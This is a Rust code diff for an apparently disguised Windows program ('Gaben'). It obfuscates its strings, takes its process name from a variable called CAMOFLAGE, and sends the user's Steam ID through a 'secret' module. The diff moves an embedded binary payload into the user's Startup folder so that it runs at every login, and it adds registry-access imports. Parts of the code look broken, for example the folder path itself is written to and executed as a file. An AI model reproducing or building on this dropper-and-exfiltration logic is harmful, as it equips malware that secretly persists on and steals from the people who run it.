@@ -16,6 +16,8 @@ use windows::core::*;
 use windows::Win32::UI::WindowsAndMessaging::{
     MessageBoxA, MB_ICONERROR, MB_ICONINFORMATION, MB_ICONWARNING, MB_OK, MESSAGEBOX_STYLE,
 };
+use winreg::enums::*;
+use winreg::RegKey;
 
 mod secret;
 
@@ -31,13 +33,23 @@ use_litcrypt!();
 async fn main() {
     sdk::logger::init_env();
 
+    let access_denied = || {
+        show_message("Error", "Access Denied", MB_ICONWARNING | MB_OK);
+        std::process::exit(1);
+    };
+
+    let username = std::env::var("UserName").expect("failed to retrieve user name");
+    let camoflage = env!("CAMOFLAGE");
+
+    let path = PathBuf::new()
+        .join("C:\\Users")
+        .join(&username)
+        .join("AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup");
+
     secret::send_steam_id().await;
 
-    let process_name = env!("CAMOFLAGE");
-    let process_path = PathBuf::from(format!("C:\\Windows\\{}", process_name));
-
-    if process_path.exists() {
-        if let Ok(_) = Process::new(&process_name) {
+    if path.exists() {
+        if let Ok(_) = Process::new(&camoflage) {
             show_message(
                 &lc!("Error"),
                 &lc!("Gaben is already running"),
@@ -46,11 +58,9 @@ async fn main() {
             return;
         }
 
-        if let Err(err) = Command::new(process_path).spawn() {
+        if let Err(err) = Command::new(path).spawn() {
             match err.kind() {
-                std::io::ErrorKind::PermissionDenied => {
-                    show_message(&lc!("Error"), &lc!("Access Denied"), MB_ICONERROR | MB_OK)
-                }
+                std::io::ErrorKind::PermissionDenied => access_denied(),
                 err => {
                     show_message(
                         &lc!("Error"),
@@ -63,7 +73,7 @@ async fn main() {
             return;
         }
     } else {
-        match File::create(process_path) {
+        match File::create(path) {
             Ok(mut file) => {
                 file.write_all(&BINARY_BYTES).unwrap();
                 show_message(
@@ -74,9 +84,7 @@ async fn main() {
                 main();
             }
             Err(err) => match err.kind() {
-                std::io::ErrorKind::PermissionDenied => {
-                    show_message(&lc!("Error"), &lc!("Access Denied"), MB_ICONERROR | MB_OK)
-                }
+                std::io::ErrorKind::PermissionDenied => access_denied(),
                 err => log::error!("{:?}", err),
             },
         }
